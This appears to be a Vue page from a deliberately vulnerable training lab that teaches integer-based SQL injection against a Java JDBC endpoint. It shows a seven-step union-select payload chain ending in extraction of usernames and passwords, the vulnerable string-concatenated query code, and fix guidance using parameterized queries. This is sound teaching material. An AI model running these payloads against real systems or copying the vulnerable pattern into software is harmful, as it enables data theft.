<template>
  <vuln-template
    title="SQL注入 - 整型注入"
    subtitle="SQL Injection - Integer Based (JDBC)"
    level="高危"
    :icon="DatabaseOutlined"
  >
    <template #description>
      <a-typography-paragraph>
        <strong>SQL注入</strong>是一种将恶意SQL代码插入到应用程序查询中的攻击技术。
      </a-typography-paragraph>
      <a-typography-paragraph>
        整型注入的特点：
      </a-typography-paragraph>
      <ul>
        <li>参数为数字类型，无需引号闭合</li>
        <li>使用Statement拼接SQL语句</li>
        <li>未对用户输入进行验证和过滤</li>
        <li>可导致数据泄露、篡改或删除</li>
      </ul>
    </template>

    <template #payload>
      <a-typography-paragraph>
        常见的SQL注入payload：
      </a-typography-paragraph>
      <a-typography-paragraph code copyable>1 or 1=1</a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">恒真条件，返回所有数据</span>
      </a-space>
      
      <a-typography-paragraph code copyable style="margin-top: 12px">1 and 1=2</a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">恒假条件，测试注入点</span>
      </a-space>

      <a-alert
        message="切勿在生产环境执行破坏性SQL语句！"
        type="warning"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #test-form>
      <!-- 模拟真实用户查询页面 -->
      <div style="background: #fff; padding: 24px; border-radius: 8px; margin-bottom: 24px;">
        <h3 style="margin-bottom: 16px; color: #1890ff;">👤 用户信息查询</h3>
        <a-form :model="formState" @finish="handleSubmit" layout="inline" style="width: 100%">
          <a-form-item
            name="id"
            :rules="[{ required: true, message: '请输入用户ID' }]"
            style="flex: 1; margin-right: 8px;"
          >
            <a-input
              v-model:value="formState.id"
              placeholder="请输入用户ID（如：1）"
              size="large"
              style="width: 100%;"
            />
          </a-form-item>
          <a-form-item>
            <a-button type="primary" html-type="submit" size="large" :loading="loading">
              <template #icon><search-outlined /></template>
              查询
            </a-button>
          </a-form-item>
        </a-form>
      </div>
      
      <!-- 显示查询结果 -->
      <div v-if="result" style="background: #f5f5f5; padding: 24px; border-radius: 8px;">
        <h4 style="margin-bottom: 16px;">📊 查询结果</h4>
        <div style="background: #fff; padding: 16px; border-radius: 4px;">
          <pre style="margin: 0; color: #1890ff; white-space: pre-wrap;">{{ result }}</pre>
        </div>
      </div>
    </template>

    <template #input-hint>
      <a-alert message="攻击示例流程" type="warning" show-icon style="margin-bottom: 12px;" />
      <p><strong>完整攻击流程：</strong></p>
      <ol style="padding-left: 20px; margin-bottom: 0; line-height: 2;">
        <li><strong>步骤1：</strong>测试注入点 - 输入 <a-typography-text code copyable>1 and 1=2</a-typography-text>，如果返回空结果，说明存在注入</li>
        <li><strong>步骤2：</strong>判断字段数 - 输入 <a-typography-text code copyable>1 order by 1</a-typography-text>，逐步增加数字直到报错</li>
        <li><strong>步骤3：</strong>联合查询 - 输入 <a-typography-text code copyable>1 union select 1,2,3</a-typography-text>，确定显示位置</li>
        <li><strong>步骤4：</strong>获取数据库名 - 输入 <a-typography-text code copyable>1 union select 1,database(),3</a-typography-text></li>
        <li><strong>步骤5：</strong>获取表名 - 输入 <a-typography-text code copyable>1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()</a-typography-text></li>
        <li><strong>步骤6：</strong>获取列名 - 输入 <a-typography-text code copyable>1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'</a-typography-text></li>
        <li><strong>步骤7：</strong>获取数据 - 输入 <a-typography-text code copyable>1 union select 1,username,password from users</a-typography-text></li>
      </ol>
    </template>


    <template #source-code>
      <a-typography-paragraph>
        <strong>后端源码（存在漏洞）：</strong>
      </a-typography-paragraph>
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="sourceCode" style="margin: 0;">
          <pre class="code-block"><code>@RestController
@RequestMapping("/home/sqli/jdbc")
public class JDBC {
    @GetMapping("/int_based")
    public String int_based(String id) {
        StringBuilder result = new StringBuilder();
        try {
            Connection conn = DriverManager.getConnection(db_url, db_user, db_pass);
            // 漏洞：虽然使用了PreparedStatement，但SQL语句是拼接的
            // PreparedStatement只有在使用?占位符时才能防止SQL注入
            String sql = "select * from users where id = " + id;
            result.append("执行SQL语句: ").append(sql).append("\n");
            
            // 错误：先拼接SQL再创建PreparedStatement，无法防止注入
            PreparedStatement st = conn.prepareStatement(sql);
            ResultSet rs = st.executeQuery();
            // 处理结果...
        } catch (Exception e) {
            result.append("错误: ").append(e.toString()).append("\n");
        }
        return result.toString();
    }
}</code></pre>
      </a-typography-paragraph>
      </div>
      <a-alert
        message="漏洞点：虽然使用了PreparedStatement，但SQL语句是字符串拼接的。PreparedStatement只有在使用?占位符时才能防止SQL注入。"
        type="error"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #fix>
      <a-typography-paragraph>
        <strong>修复建议：</strong>
      </a-typography-paragraph>
      <ul style="padding-left: 20px; line-height: 2;">
        <li><strong>使用参数化查询：</strong>使用PreparedStatement的?占位符，不要拼接SQL</li>
        <li><strong>ORM框架：</strong>使用MyBatis的#{}语法进行参数绑定</li>
        <li><strong>输入验证：</strong>对用户输入进行类型和格式验证，确保是整数</li>
        <li><strong>类型转换：</strong>将字符串转换为整数后再使用，避免字符串拼接</li>
        <li><strong>最小权限原则：</strong>数据库账号使用最小权限</li>
        <li><strong>错误处理：</strong>不要在错误信息中暴露数据库细节</li>
      </ul>
      
      <div style="margin-top: 16px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode1" style="margin: 0;">
          <pre class="code-block"><code>// 错误示例1(易受攻击) - 字符串拼接
        String sql = "SELECT * FROM users WHERE id = " + id;
        PreparedStatement st = conn.prepareStatement(sql);
ResultSet rs = st.executeQuery();</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode2" style="margin: 0;">
          <pre class="code-block"><code>// 错误示例2(易受攻击) - 虽然用了PreparedStatement但拼接了SQL
        String sql = "SELECT * FROM users WHERE id = " + id;
PreparedStatement pstmt = conn.prepareStatement(sql); // 仍然存在注入</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode3" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例1：使用?占位符
        String sql = "SELECT * FROM users WHERE id = ?";
        PreparedStatement pstmt = conn.prepareStatement(sql);
        pstmt.setInt(1, Integer.parseInt(id)); // 参数会被转义，防止注入
ResultSet rs = pstmt.executeQuery();</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode4" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例2：先验证再转换
        // 1. 验证输入格式
        if (!id.matches("^[0-9]+$")) {
            throw new IllegalArgumentException("ID必须是数字");
        }
        
        // 2. 转换为整数
        int userId = Integer.parseInt(id);
        
        // 3. 验证范围（可选）
        if (userId < 1 || userId > 10000) {
            throw new IllegalArgumentException("ID超出范围");
        }
        
        // 4. 使用参数化查询
        String sql = "SELECT * FROM users WHERE id = ?";
        PreparedStatement pstmt = conn.prepareStatement(sql);
        pstmt.setInt(1, userId);
ResultSet rs = pstmt.executeQuery();</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode5" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例3：使用MyBatis参数绑定
        // Mapper接口
User getUserById(@Param("id") Integer id);</code></pre>
        </a-typography-paragraph>
      </div>
        
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode6" style="margin: 0;">
          <pre class="code-block"><code>// XML映射文件
        &lt;select id="getUserById" resultType="User"&gt;
            SELECT * FROM users WHERE id = #{id}
        &lt;/select&gt;
// #{id}会被自动转义，防止SQL注入</code></pre>
      </a-typography-paragraph>
      </div>
    </template>
  </vuln-template>
</template>

<script setup>
import { reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import {
  DatabaseOutlined,
  SearchOutlined,
  RedoOutlined
} from '@ant-design/icons-vue'
import VulnTemplate from '@/components/VulnTemplate.vue'
import axios from 'axios'

const loading = ref(false)
const result = ref('')

const sourceCode = `@RestController
@RequestMapping("/home/sqli/jdbc")
public class JDBC {
    @GetMapping("/int_based")
    public String int_based(String id) {
        StringBuilder result = new StringBuilder();
        try {
            Connection conn = DriverManager.getConnection(db_url, db_user, db_pass);
            // 漏洞：虽然使用了PreparedStatement，但SQL语句是拼接的
            // PreparedStatement只有在使用?占位符时才能防止SQL注入
            String sql = "select * from users where id = " + id;
            result.append("执行SQL语句: ").append(sql).append("\\n");
            
            // 错误：先拼接SQL再创建PreparedStatement，无法防止注入
            PreparedStatement st = conn.prepareStatement(sql);
            ResultSet rs = st.executeQuery();
            // 处理结果...
        } catch (Exception e) {
            result.append("错误: ").append(e.toString()).append("\\n");
        }
        return result.toString();
    }
}`

const fixCode1 = `// 错误示例1(易受攻击) - 字符串拼接
String sql = "SELECT * FROM users WHERE id = " + id;
PreparedStatement st = conn.prepareStatement(sql);
ResultSet rs = st.executeQuery();`

const fixCode2 = `// 错误示例2(易受攻击) - 虽然用了PreparedStatement但拼接了SQL
String sql = "SELECT * FROM users WHERE id = " + id;
PreparedStatement pstmt = conn.prepareStatement(sql); // 仍然存在注入`

const fixCode3 = `// 正确示例1：使用?占位符
String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setInt(1, Integer.parseInt(id)); // 参数会被转义，防止注入
ResultSet rs = pstmt.executeQuery();`

const fixCode4 = `// 正确示例2：先验证再转换
// 1. 验证输入格式
if (!id.matches("^[0-9]+$")) {
    throw new IllegalArgumentException("ID必须是数字");
}

// 2. 转换为整数
int userId = Integer.parseInt(id);

// 3. 验证范围（可选）
if (userId < 1 || userId > 10000) {
    throw new IllegalArgumentException("ID超出范围");
}

// 4. 使用参数化查询
String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setInt(1, userId);
ResultSet rs = pstmt.executeQuery();`

const fixCode5 = `// 正确示例3：使用MyBatis参数绑定
// Mapper接口
User getUserById(@Param("id") Integer id);`

const fixCode6 = `// XML映射文件
<select id="getUserById" resultType="User">
    SELECT * FROM users WHERE id = #{id}
</select>
// #{id}会被自动转义，防止SQL注入`

const formState = reactive({
  id: ''
})

const handleSubmit = async () => {
  loading.value = true
  try {
    const response = await axios.get('/home/sqli/jdbc/int_based', {
      params: { id: formState.id }
    })
    result.value = response.data
    message.success('查询完成')
  } catch (error) {
    message.error('查询失败：' + (error.response?.data || error.message))
  } finally {
    loading.value = false
  }
}

const handleReset = () => {
  formState.id = ''
  result.value = ''
}
</script>

